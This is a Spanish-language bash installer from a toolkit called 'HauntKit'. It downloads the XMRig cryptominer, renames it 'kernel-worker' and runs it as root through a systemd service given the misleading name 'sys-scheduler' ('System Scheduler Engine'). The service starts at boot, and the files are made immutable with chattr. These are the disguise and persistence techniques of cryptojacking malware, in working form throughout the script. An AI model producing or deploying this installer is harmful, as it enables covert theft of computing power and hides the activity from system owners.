#!/bin/bash
# ════════════════════════════════════════════════════════
#  HauntKit — Instalador del Minero
#  Instala XMRig, configura el servicio y protege
#  los archivos de configuración
# ════════════════════════════════════════════════════════

# ─── Colores ───
RED='\033[0;31m'; GREEN='\033[0;32m'; CYAN='\033[0;36m'
YELLOW='\033[1;33m'; NC='\033[0m'

# ─── Solo root ───
if [ "$(id -u)" -ne 0 ]; then
    echo -e "${RED}[!] Debes ejecutar como root (sudo)$NC"
    exit 1
fi

# ─── Detectar directorio de HauntKit ───
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
HAUNTKIT_DIR="$(cd "$SCRIPT_DIR/../.." && pwd)"

# ─── Banner ───
echo -e "${CYAN}"
echo "╔══════════════════════════════════════════╗"
echo "║      Instalador de Minería HauntKit     ║"
echo "║         CYBER HAUNT & SPECTRE           ║"
echo "╚══════════════════════════════════════════╝"
echo -e "${NC}"

# ─── Verificar config ───
CONFIG_SRC="$SCRIPT_DIR/mine-config.env"
CONFIG_DST="/opt/hauntkit/mine-config.env"

if [ ! -f "$CONFIG_SRC" ]; then
    if [ ! -f "$CONFIG_DST" ]; then
        echo -e "${RED}[!] No existe mine-config.env${NC}"
        echo "  Cópialo desde mine-config.env.example y edítalo:"
        echo "  cp $SCRIPT_DIR/mine-config.env.example $SCRIPT_DIR/mine-config.env"
        echo "  nano $SCRIPT_DIR/mine-config.env"
        exit 1
    fi
    echo -e "${YELLOW}[*] Usando config existente en $CONFIG_DST${NC}"
else
    echo -e "${GREEN}[✓] Config encontrada${NC}"
fi

# ─── Crear directorios ───
echo -e "\n${CYAN}[*] Creando directorios...${NC}"
mkdir -p /opt/hauntkit/xmrig
chmod 755 /opt/hauntkit

# ─── Copiar config al sistema ───
if [ -f "$CONFIG_SRC" ]; then
    cp "$CONFIG_SRC" "$CONFIG_DST"
    chmod 600 "$CONFIG_DST"
    chown root:root "$CONFIG_DST"
    echo -e "${GREEN}[✓] Config protegida (root:root, chmod 600)${NC}"
fi

# ─── Copiar service script ───
cp "$SCRIPT_DIR/mine-service.sh" /opt/hauntkit/mine-service.sh
chmod 755 /opt/hauntkit/mine-service.sh
chown root:root /opt/hauntkit/mine-service.sh
echo -e "${GREEN}[✓] Service script copiado${NC}"

# ─── Crear enlace a hauntkit en /opt ───
if [ ! -d "/opt/hauntkit/hauntkit" ]; then
    ln -sf "$HAUNTKIT_DIR" /opt/hauntkit/hauntkit 2>/dev/null
    echo -e "${GREEN}[✓] Enlace al repo en /opt/hauntkit/hauntkit${NC}"
fi

# ─── Descargar XMRig si no existe ───
if [ ! -f "/opt/hauntkit/xmrig/kernel-worker" ]; then
    echo -e "\n${YELLOW}[*] Descargando XMRig...${NC}"
    LATEST=$(curl -sL https://api.github.com/repos/xmrig/xmrig/releases/latest | grep -oP '"tag_name": "\K[^"]+')
    [ -z "$LATEST" ] && LATEST="v6.22.2"

    cd /tmp
    wget -q "https://github.com/xmrig/xmrig/releases/download/$LATEST/xmrig-${LATEST#v}-linux-static-x64.tar.gz" -O xmrig.tar.gz

    if [ -f "xmrig.tar.gz" ]; then
        tar xf xmrig.tar.gz
        XMRIG_DIR_NAME=$(tar tzf xmrig.tar.gz | head -1 | cut -d/ -f1)
        if [ -n "$XMRIG_DIR_NAME" ] && [ -f "$XMRIG_DIR_NAME/xmrig" ]; then
            cp "$XMRIG_DIR_NAME/xmrig" /opt/hauntkit/xmrig/kernel-worker
            chmod 755 /opt/hauntkit/xmrig/kernel-worker
            chown root:root /opt/hauntkit/xmrig/kernel-worker
            rm -rf "$XMRIG_DIR_NAME" xmrig.tar.gz
            echo -e "${GREEN}[✓] XMRig descargado como kernel-worker${NC}"
        else
            echo -e "${RED}[!] Error al extraer XMRig${NC}"
        fi
    else
        echo -e "${RED}[!] No se pudo descargar XMRig. Descárgalo manualmente en:${NC}"
        echo "  https://github.com/xmrig/xmrig/releases"
    fi
else
    echo -e "${GREEN}[✓] XMRig ya está instalado${NC}"
fi

# ─── Verificar binario ───
if [ ! -f "/opt/hauntkit/xmrig/kernel-worker" ]; then
    echo -e "${YELLOW}[!] kernel-worker no encontrado. Puedes copiarlo manualmente.${NC}"
fi

# ─── Crear servicio systemd ───
echo -e "\n${CYAN}[*] Configurando servicio systemd...${NC}"

SERVICE_NAME="sys-scheduler"

cat > /etc/systemd/system/$SERVICE_NAME.service << 'EOF'
[Unit]
Description=System Scheduler Engine
After=network.target

[Service]
Type=simple
ExecStart=/opt/hauntkit/mine-service.sh
Restart=on-failure
RestartSec=30
User=root
Nice=10
IOSchedulingClass=best-effort
IOSchedulingPriority=7

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload 2>/dev/null
systemctl enable $SERVICE_NAME 2>/dev/null

echo -e "${GREEN}[✓] Servicio creado: $SERVICE_NAME${NC}"
echo -e "${GREEN}[✓] Arranque automático habilitado${NC}"

# ─── Proteger archivos ───
echo -e "\n${CYAN}[*] Protegiendo archivos...${NC}"

# Bloquear modificaciones accidentales a los binarios
chattr +i /opt/hauntkit/xmrig/kernel-worker 2>/dev/null && \
    echo -e "${GREEN}[✓] kernel-worker protegido (inmutable)${NC}" || \
    echo -e "${YELLOW}[!] No se pudo proteger kernel-worker (continúa igual)${NC}"

chattr +i /opt/hauntkit/mine-service.sh 2>/dev/null && \
    echo -e "${GREEN}[✓] mine-service.sh protegido${NC}" || \
    echo -e "${YELLOW}[!] mine-service.sh sin protección extra${NC}"

chmod 600 /opt/hauntkit/mine-config.env 2>/dev/null
chown root:root /opt/hauntkit/mine-config.env 2>/dev/null
echo -e "${GREEN}[✓] Config legible solo por root${NC}"

# ─── Resumen ───
echo ""
echo -e "${CYAN}╔══════════════════════════════════════════╗${NC}"
echo -e "${CYAN}║         Instalación completada           ║${NC}"
echo -e "${CYAN}╚══════════════════════════════════════════╝${NC}"
echo ""
echo "  Servicio:    $SERVICE_NAME"
echo "  Binario:     /opt/hauntkit/xmrig/kernel-worker"
echo "  Config:      /opt/hauntkit/mine-config.env"
echo "  Logs:        /opt/hauntkit/xmrig/miner.log"
echo "  Repo:        /opt/hauntkit/hauntkit (git pull para actualizar)"
echo ""
echo "  Comandos:"
echo "    Iniciar:   systemctl start $SERVICE_NAME"
echo "    Detener:   systemctl stop $SERVICE_NAME"
echo "    Estado:    systemctl status $SERVICE_NAME"
echo "    Monitorear: bash $HAUNTKIT_DIR/tools/utils/mine-monitor.sh"
echo ""

# ─── Preguntar si iniciar ───
read -rp "¿Iniciar el servicio ahora? (s/N): " START_NOW
if [[ "$START_NOW" =~ ^[sS]$ ]]; then
    systemctl start $SERVICE_NAME
    echo -e "${GREEN}[✓] Servicio iniciado${NC}"
    echo -e "${YELLOW}  El minero solo operará entre las $START_HOUR:00 y $END_HOUR:00${NC}"
fi

echo ""
echo -e "${GREEN}¡Listo, CYBER HAUNT!${NC} 🔥👻"
